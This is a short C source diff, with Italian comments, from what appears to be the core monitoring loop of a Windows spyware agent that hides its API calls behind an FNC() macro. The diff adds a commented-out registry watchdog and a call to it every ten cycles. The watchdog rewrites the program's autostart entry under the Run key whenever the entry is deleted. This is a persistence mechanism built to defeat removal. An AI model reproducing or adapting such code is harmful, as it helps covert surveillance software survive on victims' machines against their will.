@@ -631,6 +631,26 @@ DWORD WINAPI FastActionsThread(DWORD dummy)
 	return 0;
 }
 
+/*
+#define EVERY_N_CYCLES(x) DWORD i=0; i++; if (i%x == 0)
+void RegistryWatchdog()
+{
+	static char key_value[DLLNAMELEN*3] = "";
+	DWORD key_size;
+	HKEY hOpen;
+
+	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS)
+		return;
+
+	key_size = sizeof(key_value) - 1;
+	if (RegQueryValueEx(hOpen, REGISTRY_KEY_NAME, NULL, NULL, (unsigned char *)key_value, &key_size) == ERROR_FILE_NOT_FOUND) {
+		if (key_value[0] != 0) // Verifica che abbia un valore memorizzato per la stringa
+			FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
+	} 
+
+	FNC(RegCloseKey)(hOpen);
+}*/
+
 // Ciclo principale di monitoring degli eventi. E' praticamente il ciclo principale di tutto il client core.
 void SM_MonitorEvents(DWORD dummy)
 {
@@ -671,6 +691,10 @@ void SM_MonitorEvents(DWORD dummy)
 
 	// Ciclo principale di lettura degli eventi
 	LOOP {
+		// Watchdog per la chiave nel registry (una volta ogni 10 cicli)
+		/*EVERY_N_CYCLES(10)
+			RegistryWatchdog();*/
+
 		// Gestisce la lista dei processi eseguiti
 		// (va eseguita per prima nel loop).
 		SM_HandleExecutedProcess();
